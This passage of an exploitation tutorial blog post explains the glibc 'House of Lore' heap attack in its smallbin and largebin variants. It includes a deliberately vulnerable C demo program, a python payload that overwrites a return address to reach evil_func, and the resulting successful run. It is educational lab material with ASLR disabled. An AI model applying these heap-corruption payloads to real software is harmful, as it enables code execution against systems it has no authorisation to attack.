<p>In order to pass the check, the <em>a</em> variable must be set to 0x0804C000&#8217;s chunk: 0x0804BFF8. This will make the first <em>malloc()</em> call to correctly return the old <em>buff2</em>&#8216;s address. When the <em>malloc()</em> is called again, this check will be performed again and we need to handle this situation. In this new scenario, <em>victim</em> will be set at 0xFFFFCF38 and its <em>bk</em> will be, of course, located where <em>b</em> is stored. This variable must store the address of a fake chunk in such a way that its <em>fd</em> field lies on <em>c</em>: 0xFFFFCF40. Of course, <em>c</em> must be set as well to the same value of the victim: 0xFFFFCF38.<br />
The updated code will look like:</p>
<blockquote>
<pre>void func1()
{
  char *lb1, *lb2;

  unsigned int a = 0x0804BFF8;
  unsigned int b = 0xFFFFCF40;
  unsigned int c = 0xFFFFCF38;

  [...]
</pre>
</blockquote>
<p>Trying to run this one, will result into a correct allocation of both <em>lb1</em> and <em>lb2</em>: the latter points, on my machine, at 0xFFFFCF40. As the address of <em>evil_func</em> is 0x080485D5, the payload can be generated with the following command:</p>
<blockquote>
<pre>python -c 'import sys; sys.stdout.write("B" * 24 + "\xD5\x85\x04\x08")' &gt; payload
</pre>
</blockquote>
<p>Putting this altogether and running it, gives the expected result:</p>
<blockquote>
<pre>$ <strong>./hol `python -c 'import sys; sys.stdout.write("AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x38\xCF\xFF\xFF")'` &lt; payload</strong>

Buff1 -&gt; [ 0x804bfe8 ]
Buff2 -&gt; [ 0x804c000 ]
Buff3 -&gt; [ 0x804c088 ]

Buff4 -&gt; [ 0x804c190 ]
LB1 -&gt; [ 0x804c000 ]
LB2 -&gt; [ 0xffffcf40 ]
Which is your favourite hobby? 
This is an evil function. You become a cool hacker if you are able to execute it.
Segmentation fault
</pre>
</blockquote>
<p>Mission accomplished. Useless to say that ASLR was disabled during this exploitation.</p>
<p>It&#8217;s time to give a look at the alternative recipe for this attack:</p>
<h2>Largebin Corruption</h2>
<p>Ingredients:</p>
<ul>
<li>Two chunks are allocated and the first one is overflowable</li>
<li>The second chunk is freed</li>
<li>Another (potentially more) chunk, bigger than the second one, is allocated</li>
<li>A new chunk smaller than the second one is allocated</li>
<li>Another chunk with the same previous size is allocated</li>
</ul>
<p>The idea here is the same: corrupting the <em>bk</em> value of the freed chunk. The code involved into this corruption starts at line #<a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=e3ccbde7b5b84affbf6ff2387a5151310235f0a3;hb=1afdd17390f6febdfe559e16dfc5c5718f8934aa#l3912" target="_blank">3912</a>:</p>
<blockquote>
<pre>/*
  Process recently freed or remaindered chunks, taking one only if
  it is exact fit, or, if this a small request, the chunk is remainder from
  the most recent non-exact fit.  Place other traversed chunks in
  bins.  Note that this step is the only place in any routine where
  chunks are placed in bins.

  The outer loop here is needed because we might not realize until
  near the end of malloc that we should have consolidated, so must
  do so and retry. This happens at most once, and only when we would
  otherwise need to expand memory to service a "small" request.
*/

for(;;) {

  while ( (victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) {
    [...]
  }

  /*
    If a large request, scan through the chunks of current bin in
    sorted order to find smallest that fits.  This is the only step
    where an unbounded number of chunks might be scanned without doing
    anything useful with them. However the lists tend to be short.
  */

  if (!in_smallbin_range(nb)) {
    bin = bin_at(av, idx);

    /* skip scan if empty or largest chunk is too small */
    if ((victim = last(bin)) != bin &amp;&amp;
        (unsigned long)(first(bin)-&gt;size) &gt;= (unsigned long)(nb)) {

      while (((unsigned long)(size = chunksize(victim)) &lt;
              (unsigned long)(nb)))
        victim = victim-&gt;bk;

      remainder_size = size - nb;
      unlink(victim, bck, fwd);
      [...]
    }
  }

  /*
    Search for a chunk by scanning bins, starting with next largest
    bin. This search is strictly by best-fit; i.e., the smallest
    (with ties going to approximately the least recently used) chunk
    that fits is selected.

    The bitmap avoids needing to check that most blocks are nonempty.
    The particular case of skipping all bins during warm-up phases
    when no chunks have been returned yet is faster than it might look.
  */

  ++idx;
  bin = bin_at(av,idx);
  [...]

  for (;;) {
    [...]
    /* Inspect the bin. It is likely to be non-empty */
    victim = last(bin);

    /*  If a false alarm (empty bin), clear the bit. */
    if (victim == bin) {
      [...]
    }

    else {
      size = chunksize(victim);

      /*  We know the first chunk in this bin is big enough to use. */
      assert((unsigned long)(size) &gt;= (unsigned long)(nb));

      remainder_size = size - nb;

      /* unlink */
      bck = victim-&gt;bk;
      bin-&gt;bk = bck;
      bck-&gt;fd = bin;

      /* Exhaust */
      if (remainder_size &lt; MINSIZE) {
        [...]
        return chunk2mem(victim);
      }

      /* Split */
      else {
        [...]
        set_foot(remainder, remainder_size);
        check_malloced_chunk(av, victim, nb);
        return chunk2mem(victim);
      }
    }
  }
  [...]
}
</pre>
</blockquote>
<p>The first thing to keep in mind is that, reaching this code, requires to perform an allocation request for more than 512 bytes (otherwise, smallbins will be used).<br />
If the initial <em>while</em> loop is correctly passed, it means that the freed chunk has been put in its largebin. This step can be obtained by allocating, as in the smallbin scenario, a bigger chunk after freeing the second chunk.</p>
<p>Requesting an allocation of the same size of the freed chunk would trigger a block of code searching the corresponding bin for a chunk, returning the overflowed chunk. Anyway, this piece of could would use the <em>unlink()</em> macro to remove this chunk from the bin, ruining everything. This means that a smaller request must be performed, or, as Phantasmal Phantasmagoria said, &#8220;512 &lt; M &lt; N&#8221;, where N is the size of the freed chunk and M is the request we&#8217;re talking about now. If no chunks are found fitting the request of size M, <em>malloc()</em> will iterate through the bins until a fulfilling one is found.</p>
<p>The <em>victim</em> chunk will be, as usual, the last one of the bin and, in our case, it&#8217;ll be the overflowed chunk. But this code really resembles the smallbin&#8217;s one. And it actually does: the chunk is unlinked from the list without using the macro. The only difference is that <em>set_foot</em> call, as it tends to go segmentation faulting when exploiting this vulnerability without taking the right precautions. In fact, <em>remainder_size</em> is computed from <em>victim-&gt;size</em>, which is filled with random data if using the smallbin&#8217;s exploit. If the application allows to insert 0x00 bytes, then it would be possible to provide a correct value (<em>remainder_size</em> must be less than MINSIZE) in the attack string and the segmentation fault would be avoided.</p>
<p>blackngel&#8217;s rewrote his application example in order to match these new requirements:</p>
<blockquote>
<pre>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void evil_func(void)
{
  printf("\nThis is an evil function. You become a cool hacker if you are able to execute it\n");
}

void func1(void)
{
  char *lb1, *lb2;

  lb1 = (char *) malloc(1536);
  printf("\nLB1 -&gt; [ %p ]", lb1);
  lb2 = malloc(1536);
  printf("\nLB2 -&gt; [ %p ]", lb2);

  strcpy(lb1, "Which is your favourite hobby: ");
  printf("\n%s", lb1);
  fgets(lb2, 128, stdin);
}

int main(int argc, char *argv[])
{
  char *buff1, *buff2, *buff3;

  malloc(4096);
  buff1 = (char *) malloc(1024);
  printf("\nBuff1 -&gt; [ %p ]", buff1);
  buff2 = (char *) malloc(2048);
  printf("\nBuff2 -&gt; [ %p ]", buff2);
  buff3 = (char *) malloc(4096);
  printf("\nBuff3 -&gt; [ %p ]\n", buff3);

  free(buff2);

  printf("\nBuff4 -&gt; [ %p ]", malloc(4096));

  strcpy(buff1, argv[1]);

  func1();

  return 0;
}
</pre>
</blockquote>
<p>As you can see, the code is more or less the same: just the allocation requests changed. He just had to cheat a little bit for the 0x00 bytes insertion with gdb. Anyway, adjusting the code a little bit could allow to input those particular bytes.</p>
<p>However, this corruption approach didn&#8217;t last too much and a <a href="https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=7ecfbd386a340b52b6491f47fcf37f236cc5eaf1" target="_blank">patch</a> for glibc was provided in version 2.6: the <em>unlink</em> macro is now used also in this branch.</p>
<p>This is all I had to say about the House of Lore. Quite interesting, I&#8217;d say, even if only the smallbin version is still exploitable. However, the number of requirements in order to perform this kind of attack is pretty high, and I don&#8217;t know how many scenarios could actually fall in this category.</p>
<p>See you next time with the last house&#8230;</p>
		<div class="wpcnt">
			<div class="wpa wpmrec">
				<a class="wpa-about" href="https://wordpress.com/about-these-ads/" rel="nofollow"></a>
				<div class="u">
					<script type='text/javascript'>
					(function(g){g.__ATA.initAd({sectionId:26942, width:300, height:250});})(window);
					</script>
				</div>
			</div>
		</div><div id="jp-post-flair" class="sharedaddy sharedaddy-dark sd-like-enabled sd-sharing-enabled"><div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow" data-shared="sharing-twitter-455" class="share-twitter sd-button share-icon" href="https://gbmaster.wordpress.com/2015/07/16/x86-exploitation-101-house-of-lore-people-and-traditions/?share=twitter" target="_blank" title="Click to share on Twitter"><span>Twitter</span></a></li><li class="share-facebook"><a rel="nofollow" data-shared="sharing-facebook-455" class="share-facebook sd-button share-icon" href="https://gbmaster.wordpress.com/2015/07/16/x86-exploitation-101-house-of-lore-people-and-traditions/?share=facebook" target="_blank" title="Share on Facebook"><span>Facebook</span></a></li><li class="share-end"></li></ul></div></div></div><div class='sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded' id='like-post-wrapper-32641061-455-5800c184f288d' data-src='//widgets.wp.com/likes/#blog_id=32641061&amp;post_id=455&amp;origin=gbmaster.wordpress.com&amp;obj_id=32641061-455-5800c184f288d' data-name='like-post-frame-32641061-455-5800c184f288d'><h3 class='sd-title'>Like this:</h3><div class='likes-widget-placeholder post-likes-widget-placeholder' style='height: 55px;'><span class='button'><span>Like</span></span> <span class="loading">Loading...</span></div><span class='sd-text-color'></span><a class='sd-link-color'></a></div>
<div id='jp-relatedposts' class='jp-relatedposts' >
	<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
</div></div>							</div><!-- .entry-content -->

			<footer class="entry-footer">
				<span class="cat-links">Posted in <a href="https://gbmaster.wordpress.com/category/exploitation-2/" rel="category tag">Exploitation</a>.</span>			</footer><!-- .entry-footer -->

			
<div id="comments" class="comments-area">

	
	
		<h2 class="comments-title">
	2 thoughts on &ldquo;<span>x86 Exploitation 101: &#8220;House of Lore&#8221; &#8211; People and&nbsp;traditions</span>&rdquo;</h2>

		
		<ol class="comment-list">
			<li id="comment-73" class="pingback even thread-even depth-1 highlander-comment">
			<div class="comment-body">
				Pingback: <a href='http://nanxiao.me/nix-hacking-issue-6/' rel='external nofollow' class='url'>*NIX &amp; Hacking —— 第6期 | 我的站点</a> 			</div>
</li><!-- #comment-## -->
		<li id="comment-74" class="comment byuser comment-author-akamajoris odd alt thread-odd thread-alt depth-1 highlander-comment">
			<article id="div-comment-74" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://2.gravatar.com/avatar/b1bc3dcad1ed97ff739e254269b7b2df?s=75&#038;d=identicon&#038;r=G' class='avatar avatar-75' height='75' width='75' />						<b class="fn"><a href='http://akamajoris.wordpress.com' rel='external nofollow' class='url'>akamajoris</a></b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://gbmaster.wordpress.com/2015/07/16/x86-exploitation-101-house-of-lore-people-and-traditions/#comment-74">
							<time datetime="2015-07-31T17:30:21+00:00">
								July 31, 2015 at 5:30 pm							</time>
						</a>
											</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Reblogged this on <a href="https://akamajoris.wordpress.com/2015/07/31/x86-exploitation-101-house-of-lore-people-and-traditions/" rel="nofollow">Test</a>.</p>
				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://gbmaster.wordpress.com/2015/07/16/x86-exploitation-101-house-of-lore-people-and-traditions/?replytocom=74#respond' onclick='return addComment.moveForm( "div-comment-74", "74", "respond", "455" )' aria-label='Reply to akamajoris'>Reply</a></div>			</article><!-- .comment-body -->
</li><!-- #comment-## -->
</ol><!-- .comment-list -->

		
	
	
					<div id="respond" class="comment-respond">
			<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/2015/07/16/x86-exploitation-101-house-of-lore-people-and-traditions/#respond" style="display:none;">Cancel reply</a></small></h3>				<form action="https://gbmaster.wordpress.com/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate>
					<input type="hidden" id="highlander_comment_nonce" name="highlander_comment_nonce" value="a4bbbe8996" /><input type="hidden" name="_wp_http_referer" value="/2015/07/16/x86-exploitation-101-house-of-lore-people-and-traditions/" />
<input type="hidden" name="hc_post_as" id="hc_post_as" value="guest" />

<div class="comment-form-field comment-textarea">
	<label for="comment">Enter your comment here...</label>
	<div id="comment-form-comment"><textarea id="comment" name="comment" title="Enter your comment here..."></textarea></div>
</div>

<div id="comment-form-identity">

	<div id="comment-form-nascar">
		<p>Fill in your details below or click an icon to log in:</p>
		<ul>
			<li class="selected" style="display:none;">
				<a href="#comment-form-guest" id="postas-guest" title="Guest">
					<span></span>
				</a>
			</li>
			<li>
				<a href="#comment-form-load-service:WordPress.com" id="postas-wordpress" title="WordPress.com">
					<span></span>
				</a>
			</li>
			<li>
				<a href="#comment-form-load-service:Twitter" id="postas-twitter" title="Twitter">
					<span></span>
				</a>
			</li>
			<li>
				<a href="#comment-form-load-service:Facebook" id="postas-facebook" title="Facebook">
					<span></span>
				</a>
			</li>
			<li>
			<iframe id="googleplus-sign-in" name="googleplus-sign-in" src="https://public-api.wordpress.com/connect/?googleplus-sign-in=https%3A%2F%2Fgbmaster.wordpress.com" width="24" height="24" scrolling="no" allowtransparency="true" seamless="seamless" frameborder="0"></iframe>
			</li>
		</ul>
	</div>

	<div id="comment-form-guest" class="comment-form-service selected">
		<div class="comment-form-padder">
			<div class="comment-form-avatar">
<a href="https://gravatar.com/site/signup/" target="_blank">				<img src="https://1.gravatar.com/avatar/ad516503a11cd5ca435acc9bb6523536?s=25&amp;d=identicon&amp;forcedefault=y&amp;r=G" alt="Gravatar" width="25" class="no-grav" />
</a>			</div>

				<div class="comment-form-fields">
				<div class="comment-form-field comment-form-email">
					<label for="email">Email <span class="required">(required)</span> <span class="nopublish">(Address never made public)</span></label>
					<div class="comment-form-input"><input id="email" name="email" type="email" value="" /></div>
				</div>
				<div class="comment-form-field comment-form-author">
					<label for="author">Name <span class="required">(required)</span></label>
					<div class="comment-form-input"><input id="author" name="author" type="text" value="" /></div>
				</div>
				<div class="comment-form-field comment-form-url">
					<label for="url">Website</label>
					<div class="comment-form-input"><input id="url" name="url" type="text" value="" /></div>
				</div>
			</div>
	
		</div>
	</div>

	<div id="comment-form-wordpress" class="comment-form-service">
		<div class="comment-form-padder">
			<div class="comment-form-avatar">
				<img src="https://1.gravatar.com/avatar/ad516503a11cd5ca435acc9bb6523536?s=25&amp;d=identicon&amp;forcedefault=y&amp;r=G" alt="WordPress.com Logo" width="25" class="no-grav" />
			</div>

				<div class="comment-form-fields">
				<input type="hidden" name="wp_avatar" id="wordpress-avatar" class="comment-meta-wordpress" value="" />
				<input type="hidden" name="wp_user_id" id="wordpress-user_id" class="comment-meta-wordpress" value="" />
				<input type="hidden" name="wp_access_token" id="wordpress-access_token" class="comment-meta-wordpress" value="" />
				<p class="comment-form-posting-as pa-wordpress"><strong></strong> You are commenting using your WordPress.com account. <span class="comment-form-log-out">(&nbsp;<a href="javascript:HighlanderComments.doExternalLogout( 'wordpress' );">Log&nbsp;Out</a>&nbsp;/&nbsp;<a href="#" onclick="javascript:HighlanderComments.switchAccount();return false;">Change</a>&nbsp;)</span></p>
			</div>
	
		</div>
	</div>

	<div id="comment-form-twitter" class="comment-form-service">
		<div class="comment-form-padder">
			<div class="comment-form-avatar">
				<img src="https://1.gravatar.com/avatar/ad516503a11cd5ca435acc9bb6523536?s=25&amp;d=identicon&amp;forcedefault=y&amp;r=G" alt="Twitter picture" width="25" class="no-grav" />
			</div>

				<div class="comment-form-fields">
				<input type="hidden" name="twitter_avatar" id="twitter-avatar" class="comment-meta-twitter" value="" />
				<input type="hidden" name="twitter_user_id" id="twitter-user_id" class="comment-meta-twitter" value="" />
				<input type="hidden" name="twitter_access_token" id="twitter-access_token" class="comment-meta-twitter" value="" />
				<p class="comment-form-posting-as pa-twitter"><strong></strong> You are commenting using your Twitter account. <span class="comment-form-log-out">(&nbsp;<a href="javascript:HighlanderComments.doExternalLogout( 'twitter' );">Log&nbsp;Out</a>&nbsp;/&nbsp;<a href="#" onclick="javascript:HighlanderComments.switchAccount();return false;">Change</a>&nbsp;)</span></p>
			</div>
	
		</div>
	</div>

	<div id="comment-form-facebook" class="comment-form-service">
		<div class="comment-form-padder">
			<div class="comment-form-avatar">
				<img src="https://1.gravatar.com/avatar/ad516503a11cd5ca435acc9bb6523536?s=25&amp;d=identicon&amp;forcedefault=y&amp;r=G" alt="Facebook photo" width="25" class="no-grav" />
			</div>

				<div class="comment-form-fields">
				<input type="hidden" name="fb_avatar" id="facebook-avatar" class="comment-meta-facebook" value="" />
				<input type="hidden" name="fb_user_id" id="facebook-user_id" class="comment-meta-facebook" value="" />
				<input type="hidden" name="fb_access_token" id="facebook-access_token" class="comment-meta-facebook" value="" />
				<p class="comment-form-posting-as pa-facebook"><strong></strong> You are commenting using your Facebook account. <span class="comment-form-log-out">(&nbsp;<a href="javascript:HighlanderComments.doExternalLogout( 'facebook' );">Log&nbsp;Out</a>&nbsp;/&nbsp;<a href="#" onclick="javascript:HighlanderComments.switchAccount();return false;">Change</a>&nbsp;)</span></p>
			</div>
	
		</div>
	</div>

	<div id="comment-form-googleplus" class="comment-form-service">
		<div class="comment-form-padder">
			<div class="comment-form-avatar">
				<img src="https://1.gravatar.com/avatar/ad516503a11cd5ca435acc9bb6523536?s=25&amp;d=identicon&amp;forcedefault=y&amp;r=G" alt="Google+ photo" width="25" class="no-grav" />
			</div>

				<div class="comment-form-fields">
				<input type="hidden" name="googleplus_avatar" id="googleplus-avatar" class="comment-meta-googleplus" value="" />
				<input type="hidden" name="googleplus_user_id" id="googleplus-user_id" class="comment-meta-googleplus" value="" />
				<input type="hidden" name="googleplus_access_token" id="googleplus-access_token" class="comment-meta-googleplus" value="" />
				<p class="comment-form-posting-as pa-googleplus"><strong></strong> You are commenting using your Google+ account. <span class="comment-form-log-out">(&nbsp;<a href="javascript:HighlanderComments.doExternalLogout( 'googleplus' );">Log&nbsp;Out</a>&nbsp;/&nbsp;<a href="#" onclick="javascript:HighlanderComments.switchAccount();return false;">Change</a>&nbsp;)</span></p>
			</div>
	
		</div>
	</div>


	<div id="comment-form-load-service" class="comment-form-service">
		<div class="comment-form-posting-as-cancel"><a href="javascript:HighlanderComments.cancelExternalWindow();">Cancel</a></div>
		<p>Connecting to %s</p>
	</div>

</div>

<script type="text/javascript">
var highlander_expando_javascript = function(){
	var input = document.createElement( 'input' ),
	    comment = jQuery( '#comment' );

	if ( 'placeholder' in input ) {
		comment.attr( 'placeholder', jQuery( '.comment-textarea label' ).remove().text() );
	}

	// Expando Mode: start small, then auto-resize on first click + text length
	jQuery( '#comment-form-identity' ).hide();
	jQuery( '#comment-form-subscribe' ).hide();
	jQuery( '#commentform .form-submit' ).hide();

	comment.css( { 'height':'10px' } ).one( 'focus', function() {
		var timer = setInterval( HighlanderComments.resizeCallback, 10 )
		jQuery( this ).animate( { 'height': HighlanderComments.initialHeight } ).delay( 100 ).queue( function(n) { clearInterval( timer ); HighlanderComments.resizeCallback(); n(); } );
		jQuery( '#comment-form-identity' ).slideDown();
		jQuery( '#comment-form-subscribe' ).slideDown();
		jQuery( '#commentform .form-submit' ).slideDown();
	});
}
jQuery(document).ready( highlander_expando_javascript );
</script>

<div id="comment-form-subscribe">
	<p class="comment-subscription-form"><input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;"/> <label class="subscribe-label" id="subscribe-label" for="subscribe" style="display: inline;">Notify me of new comments via email.</label></p></div>




<p class="form-submit"><input name="submit" type="submit" id="comment-submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='455' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="ffe25ba47d" /></p>
<input type="hidden" name="genseq" value="1476444548" />
<p style="display: none;"><input type="hidden" id="ak_js" name="ak_js" value="39"/></p>				</form>
					</div><!-- #respond -->
		<div style="clear: both"></div>
</div><!-- #comments -->

		</div>

		<div class="sidebar">
			
<div id="secondary" class="widget-area" role="complementary">
			<aside id="recent-posts-2" class="widget widget_recent_entries">		<h1 class="widget-title">Recent Posts</h1>		<ul>
					<li>
				<a href="https://gbmaster.wordpress.com/2015/12/08/x86-exploitation-101-format-strings-ill-tell-ya-what-to-say/">x86 Exploitation 101: “Format Strings” – I&#8217;ll tell ya what to&nbsp;say</a>
							<span class="post-date">December 8, 2015</span>
						</li>
					<li>
				<a href="https://gbmaster.wordpress.com/2015/08/13/x86-exploitation-101-integer-overflow-adding-one-more-aaaaaaaaaaand-its-gone/">x86 Exploitation 101: &#8220;Integer overflow&#8221; &#8211; adding one more&#8230; aaaaaaaaaaand it&#8217;s&nbsp;gone</a>
							<span class="post-date">August 13, 2015</span>
						</li>
					<li>
				<a href="https://gbmaster.wordpress.com/2015/08/03/x86-exploitation-101-off-by-one-and-an-uninvited-friend-joins-the-party/">x86 Exploitation 101: &#8220;Off-by-one&#8221; and an uninvited friend joins the&nbsp;party</a>
							<span class="post-date">August 3, 2015</span>
						</li>
					<li>
				<a href="https://gbmaster.wordpress.com/2015/07/21/x86-exploitation-101-house-of-spirit-friendly-stack-overflow/">x86 Exploitation 101: &#8220;House of Spirit&#8221; &#8211; Friendly stack&nbsp;overflow</a>
							<span class="post-date">July 21, 2015</span>
						</li>
					<li>
				<a href="https://gbmaster.wordpress.com/2015/07/16/x86-exploitation-101-house-of-lore-people-and-traditions/">x86 Exploitation 101: &#8220;House of Lore&#8221; &#8211; People and&nbsp;traditions</a>
							<span class="post-date">July 16, 2015</span>
						</li>
					<li>
				<a href="https://gbmaster.wordpress.com/2015/06/28/x86-exploitation-101-house-of-force-jedi-overflow/">x86 Exploitation 101: &#8220;House of Force&#8221; &#8211; Jedi&nbsp;overflow</a>
							<span class="post-date">June 28, 2015</span>
						</li>
					<li>
				<a href="https://gbmaster.wordpress.com/2015/06/15/x86-exploitation-101-house-of-mind-undead-and-loving-it/">x86 Exploitation 101: &#8220;House of Mind&#8221; &#8211; Undead and loving&nbsp;it&#8230;</a>
							<span class="post-date">June 15, 2015</span>
						</li>
				</ul>
		</aside>		<aside id="archives-2" class="widget widget_archive"><h1 class="widget-title">Archives</h1>		<ul>
			<li><a href='https://gbmaster.wordpress.com/2015/12/'>December 2015</a>&nbsp;(1)</li>
	<li><a href='https://gbmaster.wordpress.com/2015/08/'>August 2015</a>&nbsp;(2)</li>
	<li><a href='https://gbmaster.wordpress.com/2015/07/'>July 2015</a>&nbsp;(2)</li>
	<li><a href='https://gbmaster.wordpress.com/2015/06/'>June 2015</a>&nbsp;(2)</li>
	<li><a href='https://gbmaster.wordpress.com/2014/08/'>August 2014</a>&nbsp;(2)</li>
	<li><a href='https://gbmaster.wordpress.com/2014/07/'>July 2014</a>&nbsp;(1)</li>
	<li><a href='https://gbmaster.wordpress.com/2014/06/'>June 2014</a>&nbsp;(1)</li>
	<li><a href='https://gbmaster.wordpress.com/2014/05/'>May 2014</a>&nbsp;(3)</li>
	<li><a href='https://gbmaster.wordpress.com/2013/11/'>November 2013</a>&nbsp;(1)</li>
	<li><a href='https://gbmaster.wordpress.com/2013/06/'>June 2013</a>&nbsp;(1)</li>
	<li><a href='https://gbmaster.wordpress.com/2013/05/'>May 2013</a>&nbsp;(1)</li>
	<li><a href='https://gbmaster.wordpress.com/2012/10/'>October 2012</a>&nbsp;(1)</li>
	<li><a href='https://gbmaster.wordpress.com/2012/04/'>April 2012</a>&nbsp;(2)</li>
	<li><a href='https://gbmaster.wordpress.com/2012/03/'>March 2012</a>&nbsp;(1)</li>
	<li><a href='https://gbmaster.wordpress.com/2012/02/'>February 2012</a>&nbsp;(2)</li>
		</ul>
		</aside><aside id="blog_subscription-2" class="widget widget_blog_subscription"><h1 class="widget-title"><label for="subscribe-field">Follow Blog via Email</label></h1>
				<form action="https://subscribe.wordpress.com" method="post" accept-charset="utf-8" id="subscribe-blog">
											<p>Enter your email address to follow this blog and receive notifications of new posts by email.</p>
<p>Join 205 other followers</p>
						<p><input type="text" name="email" style="width: 95%; padding: 1px 2px" placeholder="Enter your email address" value="" id="subscribe-field"/></p>
					
					<p>
						<input type="hidden" name="action" value="subscribe"/>
						<input type="hidden" name="blog_id" value="32641061"/>
						<input type="hidden" name="source" value="https://gbmaster.wordpress.com/2015/07/16/x86-exploitation-101-house-of-lore-people-and-traditions/"/>
						<input type="hidden" name="sub-type" value="widget"/>
						<input type="hidden" name="redirect_fragment" value="blog_subscription-2" />
						<input type="hidden" id="_wpnonce" name="_wpnonce" value="0b30ea2e05" />						<input type="submit" value="Follow" />
					</p>
				</form>
			
</aside><aside id="image-2" class="widget widget_image"><div style="overflow:hidden;"><a href="http://it.linkedin.com/in/aldomazzeo/"><img src="http://www.linkedin.com/img/webpromo/btn_myprofile_160x33.png" alt="My LinkedIn profile" class="aligncenter" width="160" height="33" /></a></div>
</aside><aside id="twitter_timeline-5" class="widget widget_twitter_timeline"><h1 class="widget-title">Follow me on Twitter</h1><a class="twitter-timeline" data-height="400" data-theme="light" data-link-color="#f96e5b" data-border-color="#e8e8e8" data-lang="EN" data-chrome="transparent" data-widget-id="">My Tweets</a></aside></div><!-- #secondary -->
		</div><!-- .sidebar -->

	</article><!-- #post-## -->
			
	<nav class="navigation post-navigation" role="navigation">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://gbmaster.wordpress.com/2015/06/28/x86-exploitation-101-house-of-force-jedi-overflow/" rel="prev">Previous Post <span class="screen-reader-text">x86 Exploitation 101: &#8220;House of Force&#8221; &#8211; Jedi&nbsp;overflow</span></a></div><div class="nav-next"><a href="https://gbmaster.wordpress.com/2015/07/21/x86-exploitation-101-house-of-spirit-friendly-stack-overflow/" rel="next">Next Post <span class="screen-reader-text">x86 Exploitation 101: &#8220;House of Spirit&#8221; &#8211; Friendly stack&nbsp;overflow</span></a></div></div>
	</nav>
		
		</main><!-- #main -->
	</div><!-- #primary -->


	</div><!-- #content -->

	<footer id="colophon" class="site-footer" role="contentinfo">

		<div class="site-info">
	<a href="https://wordpress.com/?ref=footer_blog">Blog at WordPress.com.</a>
	
	</div><!-- .site-info -->

	</footer><!-- #colophon -->
</div><!-- #page -->

<!-- wpcom_wp_footer -->
		<script type="text/javascript">
			!function(d,s,id){
				var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';
				if(!d.getElementById(id)){
					js=d.createElement(s);
					js.id=id;js.src=p+"://platform.twitter.com/widgets.js";
					fjs.parentNode.insertBefore(js,fjs);
				}
			}(document,"script","twitter-wjs");
		</script>
		<script type='text/javascript' src='//0.gravatar.com/js/gprofiles.js?ver=201641y'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var WPGroHo = {"my_hash":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://s1.wp.com/wp-content/mu-plugins/gravatar-hovercards/wpgroho.js?m=1380573781h'></script>

	<script>
		//initialize and attach hovercards to all gravatars
		jQuery( document ).ready( function( $ ) {

			if (typeof Gravatar === "undefined"){
				return;
			}

			if ( typeof Gravatar.init !== "function" ) {
				return;
			}			

			Gravatar.profile_cb = function( hash, id ) {
				WPGroHo.syncProfileData( hash, id );
			};
			Gravatar.my_hash = WPGroHo.my_hash;
			Gravatar.init( 'body', '#wp-admin-bar-my-account' );
		});
	</script>

		<div style="display:none">
	<div class="grofile-hash-map-b1bc3dcad1ed97ff739e254269b7b2df">
	</div>
	</div>
<script type='text/javascript'>
/* <![CDATA[ */
var HighlanderComments = {"loggingInText":"Logging In\u2026","submittingText":"Posting Comment\u2026","postCommentText":"Post Comment","connectingToText":"Connecting to %s","commentingAsText":"%1$s: You are commenting using your %2$s account.","logoutText":"Log Out","loginText":"Log In","connectURL":"https:\/\/gbmaster.wordpress.com\/public.api\/connect\/?action=request","logoutURL":"https:\/\/gbmaster.wordpress.com\/wp-login.php?action=logout&_wpnonce=a7aa289810","homeURL":"https:\/\/gbmaster.wordpress.com\/","postID":"455","gravDefault":"identicon","enterACommentError":"Please enter a comment","enterEmailError":"Please enter your email address here","invalidEmailError":"Invalid email address","enterAuthorError":"Please enter your name here","gravatarFromEmail":"This picture will show whenever you leave a comment. Click to customize it.","logInToExternalAccount":"Log in to use details from one of these accounts.","change":"Change","changeAccount":"Change Account","comment_registration":"0","userIsLoggedIn":"","isJetpack":"0","text_direction":"ltr"};
/* ]]> */
</script>
<script type='text/javascript' src='https://s0.wp.com/_static/??/wp-content/js/jquery/jquery.autoresize.js,/wp-content/mu-plugins/highlander-comments/script.js?m=1462457903j'></script>

	<script type="text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/gbmaster.wordpress.com\/2015\/07\/16\/x86-exploitation-101-house-of-lore-people-and-traditions\/":455};
	</script>
		<script type="text/javascript">
			var windowOpen;
		jQuery(document).on( 'ready post-load', function(){
			jQuery( 'a.share-twitter' ).on( 'click', function() {
				if ( 'undefined' !== typeof windowOpen ){ // If there's another sharing window open, close it.
					windowOpen.close();
				}
				windowOpen = window.open( jQuery(this).attr( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
				return false;
			});
		});
		</script>
				<script type="text/javascript">
			var windowOpen;
		jQuery(document).on( 'ready post-load', function(){
			jQuery( 'a.share-facebook' ).on( 'click', function() {
				if ( 'undefined' !== typeof windowOpen ){ // If there's another sharing window open, close it.
					windowOpen.close();
